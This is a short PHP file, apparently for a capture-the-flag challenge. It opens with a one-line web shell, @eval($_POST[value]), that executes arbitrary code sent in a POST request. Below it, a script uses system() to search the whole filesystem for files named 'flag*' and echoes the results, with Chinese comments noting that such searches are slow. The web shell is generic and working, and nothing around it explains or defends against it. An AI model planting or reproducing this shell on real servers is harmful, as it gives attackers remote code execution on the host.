<?php @eval($_POST[value]);
 
// 注意：搜索整个文件系统可能需要很长时间，并且通常需要 root 权限  
// 在生产环境中，这通常不是一个好的做法，除非你确切知道你在做什么  
$fileName = 'flag*'; // 要查找的文件名  
$command = "find / -name '{$fileName}' 2>/dev/null"; // 搜索命令，将标准错误输出重定向到 /dev/null  
  
// 使用 system() 执行命令  
$output = system($command, $return_var);  
  
if ($return_var === 0) {  
    echo "<pre>$output</pre>";  
    echo "找到了名为 $fileName 的文件。\n";  
} else {  
    echo "没有找到名为 $fileName 的文件。\n";  
}  
?>
